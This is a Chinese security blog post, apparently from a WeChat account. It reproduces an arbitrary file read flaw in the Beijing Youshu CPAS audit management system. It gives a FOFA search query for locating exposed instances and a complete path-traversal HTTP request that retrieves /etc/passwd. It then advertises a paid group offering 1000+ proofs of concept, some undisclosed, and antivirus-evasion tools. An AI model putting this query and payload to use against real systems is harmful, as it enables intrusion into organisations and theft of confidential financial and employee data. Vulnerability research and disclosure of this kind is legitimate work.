#  【漏洞复现】北京友数 CPAS 审计管理系统存在任意文件读取漏洞   
FL_Clover  网络安全007   2025-01-01 08:52  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORaBekPzGOIe691ZdUP4LsBz5Uic8LaTmaWG7icgNb0HfsstW77u8uLrCg/640?wx_fmt=png&from=appmsg "")  
  
漏洞介绍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocOR11vNUnAVxK5mEnib7ZCOaKtwzk3S5jDX3ZUeLMTKibUm95GBoSQk3pEg/640?wx_fmt=png&from=appmsg "")  
  
  
    在当今复杂多变的商业环境中，审计管理系统对于确保企业合规运营、防范财务风险起着中流砥柱的作用。北京友数 CPAS 审计管理系统凭借其专业的功能模块与出色的适配性，在众多行业领域获得了广泛应用，为企业和各类机构的审计工作提供了有力支撑。  
  
据最新消息称，北京友数 CPAS 审计管理系统存在任意文件读取漏洞。  
这一漏洞如同系统的 “缺口”，一旦被恶意利用，攻击者通过简单技术构造指令，就能突破文件读取权限限制，肆意翻阅机密文件，企业的审计底稿、未公开财务线索、商业秘密文件及员工敏感信息等，都可能暴露。这不仅会致商业机密泄露，打乱企业市场布局，还可能让员工受诈骗、骚扰，影响凝聚力。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORnTnnm8JW8UYWsg5pMsMAYQWvY6KGNVopgIFGTosF1icBFrCvtrnBQWQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORaBekPzGOIe691ZdUP4LsBz5Uic8LaTmaWG7icgNb0HfsstW77u8uLrCg/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocOR11vNUnAVxK5mEnib7ZCOaKtwzk3S5jDX3ZUeLMTKibUm95GBoSQk3pEg/640?wx_fmt=png&from=appmsg "")  
  
  
1.资源探测  
```
fofa:icon_hash="-58141038" && country="CN"
```  
  
2.漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORicDUqYUWUDjvBYIlr4TBWE5aSEBesFH9t4MoLVcoRxiaiby9m5EtB9erQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORaBekPzGOIe691ZdUP4LsBz5Uic8LaTmaWG7icgNb0HfsstW77u8uLrCg/640?wx_fmt=png&from=appmsg "")  
  
漏洞POC  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocOR11vNUnAVxK5mEnib7ZCOaKtwzk3S5jDX3ZUeLMTKibUm95GBoSQk3pEg/640?wx_fmt=png&from=appmsg "")  
  
```
GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName= HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORaBekPzGOIe691ZdUP4LsBz5Uic8LaTmaWG7icgNb0HfsstW77u8uLrCg/640?wx_fmt=png&from=appmsg "")  
  
帮会介绍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocOR11vNUnAVxK5mEnib7ZCOaKtwzk3S5jDX3ZUeLMTKibUm95GBoSQk3pEg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORY46W37hdIib0UibY4EBBNU8JF9KLZDzB64MiasA4iaWwuMdqtZn3HXpdsA/640?wx_fmt=png&from=appmsg "")  
  
  
【帮会服务】  
  
1.最新漏洞库（目前已1000+poc，定期更新，包含部分未公开漏洞）  
  
2.应急响应资料库（热门病毒应急响应手册，应急工具）  
  
3.安全书籍库（市面上热门安全书籍电子版）  
  
4.字典库（攻防实战字典合集，字典生成工具）  
  
5.安全制度库（100+篇安全管理制度汇编）  
  
6.攻防演练红蓝队实战经验库  
  
7.工具库（攻防实战工具，日常渗透工具，免杀工具，代码审计工具等）  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocORaBekPzGOIe691ZdUP4LsBz5Uic8LaTmaWG7icgNb0HfsstW77u8uLrCg/640?wx_fmt=png&from=appmsg "")  
  
加入方式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDoWZJHVDZGt0B9f3ibajocOR11vNUnAVxK5mEnib7ZCOaKtwzk3S5jDX3ZUeLMTKibUm95GBoSQk3pEg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  帮会刚建立，现在加入可享早鸟价：  
  
原价  
19.9月卡  
  
现在  
29.9元享永久会员！  
  
限时两周！！！  
限时两周！！！  
  
随着资源的积累后续会直接涨价至  
99.9！  
  
PC链接：https://wiki.freebuf.com/front/societyFront?society_id=291  
  
微信扫码加入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2txKvJB0ibDrP5Ku16BK5Bl1AmveJZicdUJnc3fD7iaubFnH9sJiaNCVDico4GmGUlibWGM7PabbhLlqzFPXZqrXpJLg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
<table><tbody><tr><td data-colwidth="576" width="576" valign="top"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;font-size: 17px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;font-family: system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;color: rgb(34, 34, 34);background-color: rgb(255, 255, 255);"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;font-family: 宋体;color: red;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">免责声明：</span></span></strong></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;color: rgba(0, 0, 0, 0.9);font-size: 17px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;font-family: system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;background-color: rgb(255, 255, 255);"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;font-family: 宋体;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"> </span></span><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;font-size: 14px;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">本文章仅做网络安全技术研究使用！另利用网络安全007公众号所提供的所有信息进行违法犯罪或造成任何后果及损失，均由</span><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(255, 0, 0);"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">使用者自身承担负责</span></span></strong><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">，与网络安全007公众号</span><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(255, 0, 0);"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">无任何关系</span></span></strong><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">，也不为其负任何责任，</span><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(255, 0, 0);"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">请各位自重！</span></span></strong><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">公众号发表的一切文章如有侵权烦请私信联系告知，我们会立即删除并对您表达最诚挚的歉意！感谢您的理解！</span><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(255, 0, 0);"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">让我们一起为我国网络安全事业尽一份自己的绵薄之力！</span></span></strong></span></p></td></tr></tbody></table>  
**●****推荐阅读●**  
  
**日常实战渗透小技巧，掌握就无需担心漏洞产出为零！**  
  
**红队如何在攻防演练中一夜暴富？**  
  
**全方位揭秘：50多种横向渗透提权终极技巧，一篇文章彻底掌握！**  
  
**未授权访问漏洞系列**  
  
**应急响应系列**  
# 浅谈Nacos漏洞之超管权限后续利用  
  
**记某APP服务端渗透测试实战GetShell**  
  
**实战|某网站未授权访问=》数据库权限=》服务器权限**  
  
**Nessus漏扫神器之攻防两用**  
  
**超级弱口令工具+超级字典，攻防必备！**  
  
写作不易，分享快乐  
  
期待你的 **分享**  
●**点赞●在看●关注●收藏**  
  
